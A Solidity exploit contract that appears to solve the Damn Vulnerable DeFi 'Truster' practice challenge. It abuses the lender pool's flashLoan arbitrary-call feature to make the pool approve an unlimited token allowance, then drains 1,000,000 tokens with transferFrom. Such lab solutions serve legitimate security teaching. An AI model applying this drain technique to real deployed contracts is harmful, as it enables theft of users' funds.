// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;

import "../truster/TrusterLenderPool.sol";

contract AttackTruster {
    TrusterLenderPool pool;
    IERC20 public damnValuableToken;

    constructor(address _pool, address tokenAddress) {
        pool = TrusterLenderPool(_pool);
        damnValuableToken = IERC20(tokenAddress);
    }

    function attack(address target) external {
        // call approve() with abi data

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            int256(-1)
        );

        // calling flashLoan with abi data

        pool.flashLoan(0, msg.sender, target, data);

        // once data called and approved we can call transferFrom function

        damnValuableToken.transferFrom(
            address(pool),
            msg.sender,
            1000000 ether
        );
    }
}
